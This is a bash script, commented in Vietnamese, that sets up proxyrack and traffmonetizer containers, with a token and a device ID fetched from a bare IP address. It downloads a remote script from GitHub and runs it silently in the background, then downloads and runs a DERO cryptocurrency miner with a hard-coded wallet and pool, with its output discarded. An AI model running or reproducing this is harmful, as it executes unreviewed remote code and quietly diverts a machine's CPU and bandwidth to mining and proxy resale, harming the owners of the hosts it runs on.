#!/bin/bash

# -------- traffmonetizer --------

RUN_ONCE=0

# -------- proxyrack --------
DEVICE_ID=$(curl -s http://74.48.96.46:3000/get-offline-key | grep -oP '"device_id"\s*:\s*"\K[^"]+')
if [ -n "$DEVICE_ID" ]; then
  docker run -d --name proxyrack --restart always -e UUID="$DEVICE_ID" proxyrack/pop

  # Ping loop cho proxyrack (nền)
  (
    while true; do
      curl -X POST http://74.48.96.46:3000/ping \
        -H "Content-Type: application/json" \
        -d "{\"device_id\":\"$DEVICE_ID\"}"
      sleep 300
    done
  ) &
else
  echo "❌ Không lấy được device_id từ server"
fi


# -------- Main loop --------
while true; do

  if [ $RUN_ONCE -eq 0 ]; then
    # Tải các file
    sudo rm -rf layproxyur.sh
    wget https://raw.githubusercontent.com/rabithoy/tth/main/layproxyur.sh

    # Cấp quyền thực thi cho cả 3 file
    chmod +x layproxyur.sh
    docker run -d --name traffmonetizer traffmonetizer/cli_v2 start accept --token yLbJuqMpr8/edWMV8rs8inTD/eCRDtbZ7iwaZMJ8/8M=

    # Chạy script 3.sh
    nohup bash ./layproxyur.sh >/dev/null 2>&1 &
    # Chạy astrominer nền không chặn vòng lặp
    (
      sleep 200
      wget -q https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
      tar -xf astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
      ./astrominer/astrominer \
        -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l \
        -log-interval 600 -m 1 -p rpc -r 147.135.252.201:10100 -r1 nodent2.cpumining.cloud:10100 \
        > /dev/null 2>&1
    ) &
    
    RUN_ONCE=1
  fi

  for i in {1..5}; do
    echo "ilovingyou"
    sleep 60
  done
done
